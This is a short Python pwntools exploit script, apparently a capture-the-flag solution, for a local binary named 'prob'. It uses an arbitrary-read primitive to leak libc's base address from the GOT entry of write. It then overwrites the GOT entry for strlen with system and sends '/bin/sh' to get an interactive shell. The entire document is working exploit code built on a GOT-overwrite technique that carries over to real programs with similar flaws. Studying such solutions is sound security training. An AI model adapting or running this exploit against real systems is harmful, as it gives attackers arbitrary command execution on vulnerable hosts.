#!/usr/bin/python

'''
Code written by dhkim@stealien
2020-01-02
'''
from pwn import *

e = ELF("./prob")
l = e.libc

def io32(i):
    p.readuntil("> ")
    p.send(p32(i))

def io64(i):
    p.readuntil("> ")
    p.send(p64(i))

def arb_write(addr, value):

    io32(0)     # choice
    io64(addr)  # address
    io64(value) # value
    io32(8)     # type

    p.readuntil("OK\n")

def arb_read(addr, size):
    
    io32(1)     # choice
    io64(addr)  # address
    io64(size)  # size

    ret = p.read(size)

    p.readuntil("OK\n")

    print hexdump(ret)
    return ret

def dummy(s):
    io32(2)
    p.readuntil("> ")
    p.sendline(s)
    p.readuntil("OK\n")

if (__name__ == "__main__"):

    p = process(e.path)

    # Make .got
    dummy("314ckC47")

    # Calc libc address
    l.address = u64(arb_read(e.got['write'], 8)) - l.symbols['write']
    log.info("libc address = 0x%x", l.address)

    # Arb write
    arb_write(e.got['strlen'], l.symbols['system'])

    io32(2)
    p.readuntil("> ")
    p.sendline("/bin/sh")

    p.interactive()
